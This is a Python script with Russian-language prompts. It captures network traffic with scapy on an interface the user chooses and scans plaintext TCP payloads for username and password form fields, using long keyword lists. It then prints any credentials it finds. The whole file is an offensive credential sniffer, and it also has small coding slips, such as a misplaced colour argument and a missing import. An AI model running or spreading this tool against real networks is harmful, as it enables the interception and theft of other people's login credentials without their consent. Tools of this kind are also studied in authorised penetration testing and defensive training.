import netifaces
from termcolor import colored
from scapy.all import *

# список доступных сетевых интерфейсов
interfaces = netifaces.interfaces()
# список интерфейсов для выбора пользователем
print(colored("Доступные интерфейсы:", 'green'))
for interface in interfaces:
    print(colored("- {}".format(interface), 'light_green'))
ifaces = input(colored("Введите желаемый интерфейс: ", 'blue'))
if ifaces not in interfaces:
    print(colored("Ошибка: интерфейс {} не найден".format(ifaces), 'red'))
    exit()

def get_login_pass(body):
    user = None
    passwd = None
    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario', 'customerid', 'profile',
                  'Customer_User_Name', 'clientID', 'userID', 'userLoginID', 'AccountUserName', 'login_user',
                  'authUser', 'weblogin', 'acct_login', 'member_login', 'guest', 'guest_user', 'owner',
                  'Viewer_Account_Name', 'ClientAccountName', 'user-email', 'user_email', 'UserLoginID',
                  'AccountLoginID', 'customer_name', 'client_name', 'user-login', 'login-user']
    
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 
                  'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena', 
                  'contraseña', 'contrasinalogin', 'clave', 'claveacceso', 'accesscode', 'access_key', 
                  'accesskey', 'auth', 'authorization', 'credentials', 'login_credentials', 'secret',
                  'secretpassword', 'private_key', 'root_password', 'administrator_password', 'manager_password', 
                  'mysql_pwd', 'mysql_password', 'db_password', 'ftp_password', 'imap_password', 'smtp_password', 
                  'pop3_password', 'postgresql_password', 'vncpasswd', 'rpc_password', 'admin_pwd', 'administratorpwd',
                  'apppassword', 'dbpwd', 'dbpasswd', 'dbspassword', 'encpassword', 'transactpwd', 'idpassword', 
                  'username-password-authentication-password', 'LDAPLoginPassword', 'spring.security.password', 
                  'p@ssword', 'passwd@123', 'pass123', 'superpassword', 'superscret', 'top_secret', 'ts_admin',
                  'guru', 'god', 'test', 'testing', 'test123', 'welcome', 'hello', '123456', 'abc123', 'letmein']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()
    if user and passwd:
        return(user, passwd)
    

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(colored(parse.unquote(user_pass[0])), 'yellow')
            print(colored(parse.unquote(user_pass[1])))
    else:
        pass


try:
    sniff(iface=ifaces, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print(colored("exit", 'red'))
    exit(0)